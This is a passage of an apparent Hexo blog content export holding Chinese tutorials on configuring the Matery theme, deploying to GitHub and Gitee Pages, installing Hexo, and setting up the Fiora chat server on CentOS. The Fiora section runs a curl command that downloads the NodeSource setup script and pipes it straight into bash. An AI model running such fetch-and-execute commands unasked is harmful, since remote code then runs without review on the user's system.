class="language-bash"><span class="token function">npm</span> i -S hexo-prism-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置，主要配置如下：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">prism_plugin:  mode: 'preprocess'    # realtime/preprocess  theme: 'tomorrow'  line_number: false    # default false  custom_css:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当你添加代码块时一定要加上语言的名字不然此功能会无效！</p><h2 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h2><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">search:  path: search.xml  field: post  format: html  limit: 10000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="中文链接转拼音（可选的）"><a href="#中文链接转拼音（可选的）" class="headerlink" title="中文链接转拼音（可选的）"></a>中文链接转拼音（可选的）</h2><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 SEO，且 gitment 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin" target="_blank" rel="noopener">hexo-permalink-pinyin Hexo</a> 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i hexo-permalink-pinyin --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">permalink_pinyin:  enable: true  separator: '-' # default: '-'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p><h2 id="文章字数统计插件（可选的）"><a href="#文章字数统计插件（可选的）" class="headerlink" title="文章字数统计插件（可选的）"></a>文章字数统计插件（可选的）</h2><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后只需在本主题下的 _config.yml 文件中，激活以下配置项即可：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">wordCount:  enable: false # 将这个值设置为 true 即可.  postWordCount: true  min2read: true  totalCount: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h2><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 的 Hexo 插件来做 RSS，安装命令如下：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: ' '  order_by: -date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后在 public 文件夹中即可看到 atom.xml 文件，说明你已经安装成功了。</p><h2 id="添加在线聊天功能（可选的）"><a href="#添加在线聊天功能（可选的）" class="headerlink" title="添加在线聊天功能（可选的）"></a>添加在线聊天功能（可选的）</h2><h3 id="添加-DaoVoice-在线聊天功能"><a href="#添加-DaoVoice-在线聊天功能" class="headerlink" title="添加 DaoVoice 在线聊天功能"></a>添加 DaoVoice 在线聊天功能</h3><p>前往 <a href="https://www.daocloud.io/" target="_blank" rel="noopener">DaoVoice</a> 官网注册并且获取 app_id，并将 app_id 填入主题的 _config.yml 文件即可在设置调整位置。</p><h3 id="添加-Tidio-在线聊天功能"><a href="#添加-Tidio-在线聊天功能" class="headerlink" title="添加 Tidio 在线聊天功能"></a>添加 Tidio 在线聊天功能</h3><p>前往 <a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 官网注册并且获取 Public Key，并将 Public Key 填入主题的 _config.yml 文件中。</p><h2 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h2><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 /layout/_partial/footer.ejs 文件中，包括站点、使用的主题、访问量等。</p><h2 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h2><hr><p>在主题的 _config.yml 文件中，默认支持 QQ、GitHub 和邮箱等的配置，你可以在主题文件的 /layout/_partial/social-link.ejs 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><hr><pre><code>&lt;% if (theme.socialLink.github) { %&gt;&lt;a href=&quot;&lt;%= theme.socialLink.github %&gt;&quot; class=&quot;tooltipped&quot; target=&quot;_blank&quot; data-tooltip=&quot;访问我的GitHub&quot; data-position=&quot;top&quot; data-delay=&quot;50&quot;&gt;    &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;&lt;/a&gt;&lt;% } %&gt;</code></pre><p>其中，社交图标（如：fa-github）你可以在 <a href="http://www.fontawesome.com.cn/icons-ui/" target="_blank" rel="noopener">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><p>Facebook: fab fa-facebook<br>Twitter: fab fa-twitter<br>Google-plus: fab fa-google-plus<br>Linkedin: fab fa-linkedin<br>Tumblr: fab fa-tumblr<br>Medium: fab fa-medium<br>Slack: fab fa-slack<br>Sina Weibo: fab fa-weibo<br>Wechat: fab fa-weixin<br>QQ: fab fa-qq<br>Zhihu: fab fa-zhihu</p><h2 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h2><p>在主题文件的 source/medias/reward 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片(名称和格式不要改变)。</p><h2 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h2><p>要支持音乐播放，在主题的 _config.yml 配置文件中激活music配置即可：</p><hr><pre class="line-numbers language-yml"><code class="language-yml"># 是否在首页显示音乐music:  enable: true  title:             #非吸底模式有效    enable: true    show: 听听音乐  server: netease   #require music platform: netease, tencent, kugou, xiami, baidu  type: playlist    #require song, playlist, album, search, artist  id: 503838841     #require song id / playlist id / album id / search keyword  fixed: false      # 开启吸底模式  autoplay: false   # 是否自动播放  theme: '#42b983'  loop: 'all'       # 音频循环播放, 可选值: 'all', 'one', 'none'  order: 'random'   # 音频循环顺序, 可选值: 'list', 'random'  preload: 'auto'   # 预加载，可选值: 'none', 'metadata', 'auto'  volume: 0.7       # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效  listFolded: true  # 列表默认折叠<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>server可选netease（网易云音乐），tencent（QQ音乐），kugou（酷狗音乐），xiami（虾米音乐），<br>baidu（百度音乐）。</p><p>type可选song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）</p><p>id获取示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，地址栏链接问号id后的数字即为playlist ID。</p><h1 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h1><p>Front-matter 选项中的所有内容均为非必填的。但仍然建议至少填写 title 和 date 的值。</p><p>注意:</p><p>如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。</p><p>date 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。</p><p>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活配置。</p><p>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则<br>以下为文章的 Front-matter 示例。</p><h2 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h2><hr><pre><code>---title: 蝴蝶主题介绍date: 2020-09-30 13:30:00---</code></pre><h2 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h2><pre><code>---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags: - Typora - Markdown---</code></pre><h2 id="自定义修改"><a href="#自定义修改" class="headerlink" title="自定义修改"></a>自定义修改</h2><p>在本主题的 _config.yml 中可以修改部分自定义信息，有以下几个部分：</p><hr><pre><code>菜单我的梦想首页的音乐播放器和视频播放器配置是否显示推荐文章名称和按钮配置favicon 和 Logo个人信息TOC 目录文章打赏信息复制文章内容时追加版权信息MathJax文章字数统计、阅读时长点击页面的’爱心’效果我的项目我的技能我的相册Gitalk、Gitment、Valine 和 disqus 评论配置不蒜子统计和谷歌分析（Google Analytics）默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 hashcode 值取余，来选择展示对应的特色图</code></pre><p>我认为个人博客应该都有自己的风格和特色。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 _config.yml 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h4 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h4><p>在主题文件的 /source/css/matery.css 文件中，搜索 .bg-color 来修改背景颜色：</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token comment" spellcheck="true">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span>    <span class="token selector"><span class="token class">.bg-color</span> </span><span class="token punctuation">{</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#4cbf30</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*如果想去掉banner图的颜色渐变效果，请将以下的css属性注释掉或者删除掉即可*/</span>    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span>    <span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你不知道自己颜色的数值的话，<a href="https://www.materialpalette.com/colors" target="_blank" rel="noopener">这里</a>是一个在线配色的工具。</p><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 /source/medias/banner 文件夹中更换你喜欢的 banner 图片，主题代码中是每天动态切换一张，只需 7 张即可。如果你会 JavaScript 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，banner 切换的代码位置在 /layout/_partial/bg-cover-content.ejs 文件的代码中：</p><hr><pre><code>$(&#39;.bg-cover&#39;).css(&#39;background-image&#39;, &#39;url(/medias/banner/&#39; + new Date().getDay() + &#39;.jpg)&#39;);</code></pre><p>在 /source/medias/featureimages 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 _config.yml 做同步修改。</p><p>如果想改为每小时或者每分钟切换banner图的话，需要将</p><hr><pre><code>getDay()改为getHours()或者getMinutes()</code></pre><p>即可。</p><h3 id="去掉banner的颜色动画"><a href="#去掉banner的颜色动画" class="headerlink" title="去掉banner的颜色动画"></a>去掉banner的颜色动画</h3><p>有的朋友可能不喜欢banner的颜色遮罩，特别是在banner图片的颜色和动画颜色一样时，表现不出图片的美观。去掉后放一张高清小姐姐大图，博客访问量一下迅速爆炸！听我的准没错，那如何去掉这个烦人的彩色动画呢？跟着我：在theme主题目录下，找到matery.css文件,ctrl+F快捷键查找.bg-cover:after，注释掉即可:</p><hr><pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/* .bg-cover:after {     -webkit-animation: rainbow 60s infinite;               animation: rainbow 60s infinite; } */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改目录样式"><a href="#修改目录样式" class="headerlink" title="修改目录样式"></a>修改目录样式</h3><p>在themes\Matery\layout_partial\post-detail-toc.ejs，在这里修改:</p><pre class="line-numbers language-ejs"><code class="language-ejs">    .toc-widget {         width: 345px;         padding-left: 20px;         background-color: rgb(255, 255, 255,0.7);        border-radius: 10px;         box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;         }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改网站相关信息"><a href="#修改网站相关信息" class="headerlink" title="修改网站相关信息"></a>修改网站相关信息</h3><p>网站信息的修改</p><pre class="line-numbers language-yml"><code class="language-yml">    #这是根目录下的配置文件信息    title: 过客~铭む   #这是网站标题    subtitle: Mx    #这是网站副标题subtitler    # 下面两个description,keywords，需要填上，如果想让搜索引擎收录，这个做SEO优化必不可忽视的两个属性    description: 一个分享快乐和知识的地方！  #网站描述    keywords: [HTML, CSS, JavaScript, JQuery, React, Vue.js等]  #网站的关键词    author: YangAir  #作者，文章版权所显示的    language: zh-CN  #网站语言，不填写，默认为英文    timezone:   #时区，可以不填写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>    # 这是主题配置文件的相关信息    # 配置网站favicon和网站LOGO    # 此处我用的本地文件，也可以使用图床或者CDN    favicon: /medias/favicon.png    logo: /medias/logo.png    # 网站副标题，打字效果    # 如果有符号 ‘ ，请在 ’ 前面加上 \    subtitle:       enable: true      loop: true # 是否循环      showCursor: true # 是否显示光标      startDelay: 300 # 开始延迟      typeSpeed: 100 # 打字速度      backSpeed: 50 # 删除速度      sub1: 志之所向，金石为开，谁能御之？      sub2: 花开不是为了花落，而是为了开的更加灿烂。      sub3: 没有伞的孩子必须努力奔跑！      sub4: 欲望以提升热忱，毅力以磨平高山。      sub5: 如果放弃太早，你永远都不知道自己会错过什么。      sub6: 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生。</code></pre><p>注意：</p><p>网站打字效果副标题默认有两个，即sub1和sub2，如果想写多个，则需要修改两处地方，首先修改配置文件，如上面所示，在sub1和sub2后面继续添加即可，然后在去主题目录下的layout文件夹下的_partial文件夹，修改bg-cover-content.ejs文件，大约在12行左右，如下面所示：</p><pre><code>     &lt;div class=&quot;description center-align&quot;&gt;         &lt;% if (theme.subtitle.enable) { %&gt;         &lt;span id=&quot;subtitle&quot;&gt;&lt;/span&gt;         &lt;script src=&quot;https://cdn.jsdelivr.net/npm/typed.js@2.0.11&quot;&gt;&lt;/script&gt;        &lt;script&gt;            var typed = new Typed(&quot;#subtitle&quot;, {                strings: [&#39;&lt;%= theme.subtitle.sub1 %&gt;&#39;,                          &#39;&lt;%= theme.subtitle.sub2 %&gt;&#39;,                          &#39;&lt;%= theme.subtitle.sub3 %&gt;&#39;,                          &#39;&lt;%= theme.subtitle.sub4 %&gt;&#39;,                          &#39;&lt;%= theme.subtitle.sub5 %&gt;&#39;,                          &#39;&lt;%= theme.subtitle.sub6 %&gt;&#39;],                 startDelay: &lt;%= theme.subtitle.startDelay %&gt;,                 typeSpeed: &lt;%= theme.subtitle.typeSpeed %&gt;,                 loop: &lt;%= theme.subtitle.loop %&gt;,                    backSpeed: &lt;%= theme.subtitle.backSpeed %&gt;,                 showCursor: &lt;%= theme.subtitle.showCursor %&gt;              });          &lt;/script&gt;      &lt;% } else { %&gt;            &lt;%= config.description %&gt;      &lt;% } %&gt;     &lt;/div&gt;</code></pre><h3 id="社交链接的修改"><a href="#社交链接的修改" class="headerlink" title="社交链接的修改"></a>社交链接的修改</h3><p>默认的配置信息为：</p><hr><pre><code># 首页 banner 中的第二行个人信息配置，留空即不启用socialLink:  github:  https://github.com/blinkfox  email: 1181062873@qq.com  facebook: # https://www.facebook.com/xxx  twitter: # https://twitter.com/xxx  QQ: 1181062873  weibo: # https://weibo.com/xxx  zhihu: # https://www.zhihu.com/xxx  rss: true # true、false</code></pre><p>如果想添加简书，CSDN，掘金，博客园等等，需要在主题配置文件添加相关配置，按照默认的复制修改即可。</p><p>最后注意: 修改源代码或者配置文件时仔细检查下有没有少打空格以及标点符号是不是英文的。</p>]]></content>
      
      
      <categories>
          
          <category> hexo Matery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo Matery </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客部署到Github和Gitee</title>
      <link href="/2021/01/15/15/"/>
      <url>/2021/01/15/15/</url>
      
        <content type="html"><![CDATA[<p>目前我们的博客还是在本地的，接下来要把它部署到远端，这样别人就可以访问你的博客了。本文记录使用Github和Gitee来托管我们的博客。</p><h2 id="托管方案"><a href="#托管方案" class="headerlink" title="托管方案"></a>托管方案</h2><p>Github或者Gitee（码云）的Pages服务，它们都能够免费托管站点，没必要专门弄个服务器。其中Gitee访问会比较快点，毕竟是国内的。</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p>创建一个仓库，仓库设置为公开的才能免费使用Github Pages服务。<br>仓库名必须设置为：&lt;用户名&gt;.github.io<br>如下图：我的Github用户名为sq666，那么就需要创建一个名为sq666.github.io的公开仓库。创建完成后，我们就可以通过&lt;用户名&gt;.github.io来访问我们的站点了。</p><h3 id="Gitee"><a href="#Gitee" class="headerlink" title="Gitee"></a>Gitee</h3><p>创建一个仓库，设置为公开或私有都可以。<br>仓库名如果设置成和个人空间地址一样，那么访问地址就是： &lt;个人空间地址名&gt;.gitee.io<br>个人空间地址可在个人资料中查看。我的个人空间地址是sq666，那么我的博客地址就是：sq666.gitee.io。仓库名如果设置成别的，那么访问地址则是：&lt;个人空间地址名&gt;.gitee.io/仓库名<br>例如我把仓库名设置为myblog，那么我的博客访问地址就是：sq666.gitee.io/myblog<br>创建完成后，我们需要在该仓库页面中 点击“服务” &gt; Gitee Pages &gt; 勾选“强制使用HTTPS” &gt; 点击“启动”即可。</p><h2 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h2><h3 id="安装部署插件"><a href="#安装部署插件" class="headerlink" title="安装部署插件"></a>安装部署插件</h3><p>在博客根目录中执行以下命令：</p><hr><pre><code>$ cnpm install hexo-deployer-git --save</code></pre><h3 id="修改部署配置"><a href="#修改部署配置" class="headerlink" title="修改部署配置"></a>修改部署配置</h3><p>复制刚刚创建的仓库地址。<br>https：部署需要账户密码。<br>ssh：部署不需要密码，但需要先配置一下ssh key<br>在站点配置文件中修改如下配置：</p><hr><pre><code>deploy: type: git repo: https://github.com/guanmianli/guanmianli.github.io.git # 仓库地址branch: master # 部署分支</code></pre><p>我们也可以设置同时部署到Github和Gitee：</p><hr><pre><code>deploy: type: git repo: https://github.com/guanmianli/guanmianli.github.io.git repo: https://gitee.com/gavincrown/gavincrown.git branch: master</code></pre><p>如果域名带子目录，那么还需要多一步设置：<br>在站点配置文件中找到如下选项，url设置为你的完整域名，root设置为你的子目录。</p><hr><pre><code># URL url: https://gavincrown.gitee.io/myblog root: /myblog</code></pre><h3 id="执行部署命令"><a href="#执行部署命令" class="headerlink" title="执行部署命令"></a>执行部署命令</h3><p>在博客根目录中执行以下命令：</p><hr><pre><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>对于Gitee Pages，由于不支持自动更新，每次执行命令部署后需要手动点击更新，等待更新完成后访问地址即可看到效果。如果看不到效果的话，暂停服务，然后再重新启动。对于GitHub Pages，它支持自动更新，无需额外操作，稍等片刻后访问即可。</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建环境 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建hexo个人博客</title>
      <link href="/2021/01/14/14/"/>
      <url>/2021/01/14/14/</url>
      
        <content type="html"><![CDATA[<p>使用的系统是Windows10<br>环境 git node.js</p><hr><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>因为hexo是由node.js 生成的，所以需要下载安装node.js<br>访问 nodejs.org, 下载并安装。安装完成后有一个绿色的node.js 和一个黑色的node.js command prompt (命令提示符)然后再到这个<a href="https://git-scm.com/book/zh/v2/%E8%B5%B7%E6%AD%A5-%E5%AE%89%E8%A3%85-Git" target="_blank" rel="noopener">地址</a>下载git并安装。</p><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><p>右键单击打开git bash命令行</p><hr><pre><code>输入node -v（注意空格）查看版本输入npm -v 查看包管理器的版本</code></pre><p>为了加快速度，需要用npm安装cnpm，用它指向淘宝的镜像源</p><hr><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.org安装完成后用 cnpm -v 查看版本</code></pre><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><hr><pre><code>cnpm install -g hexo-cli</code></pre><p>创建存放博客系统的文件夹，放哪里自己决定（建议放到E盘）</p><hr><pre><code>md blog</code></pre><h3 id="初始化个人博客"><a href="#初始化个人博客" class="headerlink" title="初始化个人博客"></a>初始化个人博客</h3><p>初始化博客站点，进入blog目录执行下面的命令。（如果最后一行显示Start blogging with Hexo!，代表创建成功。）</p><hr><pre><code>hexo init</code></pre><p>启动博客站点</p><hr><pre><code>hexo s # server</code></pre><p>运行后显示</p><hr><pre><code>INFO  Start processingINFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</code></pre><p>之后可进入 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 查看本地博客。<br>如何把hexo博客推送到gitee和github请看<a href="https://www.mx142.cn/2021/01/15/15/" target="_blank" rel="noopener">这篇文章</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搭建环境 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客加入html页面</title>
      <link href="/2021/01/13/13/"/>
      <url>/2021/01/13/13/</url>
      
        <content type="html"><![CDATA[<h2 id="一-把源码放到站点根目录"><a href="#一-把源码放到站点根目录" class="headerlink" title="一.把源码放到站点根目录"></a>一.把源码放到站点根目录</h2><p>把你的html源码放到新建文件夹-（名称随便）再把新建的那个文件夹放到你博客的source-（站点根目录）里。</p><h2 id="二-跳过渲染"><a href="#二-跳过渲染" class="headerlink" title="二.跳过渲染"></a>二.跳过渲染</h2><p>到博客目录的配置文件-（_config.yml）找到</p><hr><pre><code>skip_render: </code></pre><p>这一行后面添加:</p><hr><pre><code>skip_render:    -  &quot;你新建的文件夹名称/*&quot;</code></pre><p>其他参数:</p><hr><pre><code># 跳过文件夹下所有文件skip_render:    - &quot;文件夹名/*&quot;  # 跳过子文件夹skip_render:    - &quot;文件夹名/子文件夹名/*&quot;# 跳过文件夹下所有子文件夹和文件skip_render:    - &quot;文件夹名/**&quot;   </code></pre><h2 id="三-引入页面"><a href="#三-引入页面" class="headerlink" title="三.引入页面"></a>三.引入页面</h2><p>到博客主题目录-（blog/themes/主题文件夹）下找到主题配置文件-（_config.yml），添加</p><hr><pre><code>- name: 随意  url: /你新建文件夹名称  icon: 随意</code></pre><p>然后部署即可:</p><hr><pre><code>hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><p>最后会看到你喜欢的页面成功的搞到了你的博客里。</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建一款二次元的Web在线聊天室Fiora</title>
      <link href="/2021/01/04/12/"/>
      <url>/2021/01/04/12/</url>
      
        <content type="html"><![CDATA[<p><a href="https://fiora.suisuijiang.com/" target="_blank" rel="noopener">fiora聊天室</a>是由<a href="https://suisuijiang.com/" target="_blank" rel="noopener">碎碎酱</a>开发</p><p>使用的系统是Linux Centos7.6<br>注意: 512M内存vps可能还需要先加一点虚拟内存，不然构建过程会失败。</p><hr><h1 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h1><h2 id="一、安装Nodejs"><a href="#一、安装Nodejs" class="headerlink" title="一、安装Nodejs"></a>一、安装Nodejs</h2><hr><pre><code>curl -sL https://rpm.nodesource.com/setup_10.x | bash -yum install nodejs git -y</code></pre><h2 id="二、安装Mongodb"><a href="#二、安装Mongodb" class="headerlink" title="二、安装Mongodb"></a>二、安装Mongodb</h2><hr><pre><code>#将下面命令一起复制进SSH客户端运行cat &lt;&lt;EOF &gt; /etc/yum.repos.d/mongodb.repo[mongodb-org-4.0]name=MongoDB Repositorybaseurl=https://repo.mongodb.org/yum/redhat/7/mongodb-org/4.0/x86_64/gpgcheck=1enabled=1gpgkey=https://www.mongodb.org/static/pgp/server-4.0.ascEOFyum -y install mongodb-org</code></pre><p>注意: 如果导入公匙时出现gnupg, gnupg2 and gnupg1 do not seem to be installed错误，使用apt install -y gnupg2，然后重新导入即可。</p><h3 id="1、启动Mongodb并设置开机自启："><a href="#1、启动Mongodb并设置开机自启：" class="headerlink" title="1、启动Mongodb并设置开机自启："></a>1、启动Mongodb并设置开机自启：</h3><hr><pre><code>systemctl start mongodsystemctl enable mongod</code></pre><h2 id="三、安装redis并设置后台运行"><a href="#三、安装redis并设置后台运行" class="headerlink" title="三、安装redis并设置后台运行"></a>三、安装redis并设置后台运行</h2><h3 id="1、下载redis安装包"><a href="#1、下载redis安装包" class="headerlink" title="1、下载redis安装包"></a>1、下载redis安装包</h3><p>新开一个终端输入:</p><hr><pre><code>wget http://download.redis.io/releases/redis-4.0.6.tar.gz</code></pre><h3 id="2、解压压缩包"><a href="#2、解压压缩包" class="headerlink" title="2、解压压缩包"></a>2、解压压缩包</h3><hr><pre><code>tar -zxvf redis-4.0.6.tar.gz</code></pre><h3 id="3、yum安装gcc依赖"><a href="#3、yum安装gcc依赖" class="headerlink" title="3、yum安装gcc依赖"></a>3、yum安装gcc依赖</h3><hr><pre><code>yum install gcc</code></pre><p>输入y即可</p><h3 id="4、跳转到redis解压目录下"><a href="#4、跳转到redis解压目录下" class="headerlink" title="4、跳转到redis解压目录下"></a>4、跳转到redis解压目录下</h3><hr><pre><code>cd redis-4.0.6</code></pre><h3 id="5、编译安装"><a href="#5、编译安装" class="headerlink" title="5、编译安装"></a>5、编译安装</h3><hr><pre><code>make MALLOC=libc</code></pre><p>将/usr/local/redis-4.0.6/src目录下的文件加到/usr/local/bin目录</p><hr><pre><code>cd src &amp;&amp; make install</code></pre><p>到redis-4.0.6/src目录下测试有没有安装成功</p><hr><pre><code> ./redis-server</code></pre><p>末尾为Ready to accept connections就说明安装成功了。</p><h3 id="6、以后台进程方式运行redis"><a href="#6、以后台进程方式运行redis" class="headerlink" title="6、以后台进程方式运行redis"></a>6、以后台进程方式运行redis</h3><p>到redis-4.0.6目录下修改redis.conf文件。</p><hr><pre><code>cd ..vim redis.conf</code></pre><p>将</p><hr><pre><code>daemonize no</code></pre><p>修改为</p><hr><pre><code>daemonize yes</code></pre><p>最后指定redis.conf文件启动即可。</p><hr><pre><code>./redis-server /usr/local/redis-4.0.6/redis.conf</code></pre><h2 id="四、安装fiora"><a href="#四、安装fiora" class="headerlink" title="四、安装fiora"></a>四、安装fiora</h2><hr><pre><code>#拉取源码并存放于/opt文件夹git clone 